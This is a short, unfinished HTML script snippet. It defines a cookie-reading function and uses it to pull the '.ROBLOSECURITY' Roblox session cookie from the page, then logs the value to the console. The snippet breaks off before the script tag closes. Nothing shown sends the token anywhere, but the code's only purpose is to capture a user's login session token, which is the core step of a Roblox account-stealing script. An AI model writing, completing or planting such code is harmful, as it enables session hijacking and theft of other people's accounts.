    <!-- Cookie Retrieval Script -->
    <script>
        // Function to get a specific cookie by name
        function getCookie(name) {
            let cookieArr = document.cookie.split(";");
            
            for (let i = 0; i < cookieArr.length; i++) {
                let cookiePair = cookieArr[i].split("=");
                
                if (name === cookiePair[0].trim()) {
                    return decodeURIComponent(cookiePair[1]);
                }
            }
            
            return null;
        }

        // Attempt to retrieve the .ROBLOSECURITY cookie
        let robloSecurityCookie = getCookie('.ROBLOSECURITY');
        console.log(robloSecurityCookie);  // Logs the cookie value to the console (for testing purposes)
